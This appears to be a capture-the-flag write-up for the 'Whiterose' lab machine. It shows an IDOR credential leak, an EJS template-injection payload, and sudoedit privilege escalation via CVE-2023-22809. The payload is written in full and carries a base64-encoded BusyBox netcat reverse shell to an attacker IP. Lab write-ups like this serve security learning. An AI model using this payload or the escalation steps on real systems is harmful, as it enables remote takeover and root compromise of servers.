# Whiterose

I started by enumerating the machine:

![nmap.png](/images/reports/whiterose/nmap.png)

The Gobuster search revealed nothing. I reasearched online and I found out I need to look for vhost.

![gobuster.png](/images/reports/whiterose/gobuster.png)

So we have the admin vhost, I’ve added this to my `/etc/hosts` file and then went to the `/login` page:

![login.png](/images/reports/whiterose/login.png)

I’ve logged in using the credentials given in the box’s description and landed on this page:

![page.png](/images/reports/whiterose/page.png)

Looking through the pages we see a page called ‘Messages’, looking closely at the URL we can see the parameter `?c=5`. We can check this for IDOR, increasing the number lead to more messages appearing, when I reach the value 8 I got this message:

![idor.png](/images/reports/whiterose/idor.png)

After 8 we only got one message that being from ‘DEV TEAM’. So we got credentials for Gayle Bev. 

Now we can answer the first question, since Gayle is admin he can see the phone numbers:

![phone no.png](/images/reports/whiterose/phone_no.png)

Now if we go to the settings page, we can see that we can change the password for a user. The updated password is reflected on the webpage, this lead me to think about XSS:

![settings.png](/images/reports/whiterose/settings.png)

I intercepted the request in Burp and removed the password paramter to see if any error arise, we can see an error regarding ejs, I search online and this can be targeted and exploited causing a RCE. We just need to copy the payload and add the reverse shell. 

![error.png](/images/reports/whiterose/error.png)

I used a basic reverse shell, but it didn’t work. Looking at the hint, we learn that the payload we use is important, so I tried other payloads. After a bit of help from online, I managed to get this payload:

`name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo 

YnVzeWJveCBuYyAxOTIuMTY4LjE4My41MCAxMzM3IC1lIHNo | base64 -d | bash"');//`

Inside the `execSync` is the reverse shell, I used a BusyBox rev shell base64 encoded. This gave me the shell:

![shell.png](/images/reports/whiterose/shell.png)

After getting the user flag, I moved to the privilege escalation, I ran `sudo -l`:

![sudo -l.png](/images/reports/whiterose/sudo_-l.png)

I Googled sudoedit online and we have **CVE-2023-22809 (**[https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)**).** 

We can specify the EDITOR variable to read files. We can use this to read the root flag.

In order to get root access, we need to change the /etc/sudoers and set the sudo permissions to ALL.